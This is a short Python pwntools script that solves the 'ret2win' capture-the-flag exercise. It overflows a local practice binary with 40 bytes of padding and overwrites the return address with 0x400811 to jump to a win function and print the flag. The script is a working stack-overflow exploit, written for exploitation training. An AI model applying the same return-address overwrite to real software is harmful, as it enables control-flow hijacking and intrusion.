from pwn import *

e = ELF('./ret2win')
p = e.process()

print(p.recv().decode())

padding = b'A' * 40
address = p64(0x400811)

payload = padding + address
p.sendline(payload)

print(p.recvuntil("Here's your flag:").decode())
flag = p.recvline().decode()

success(flag)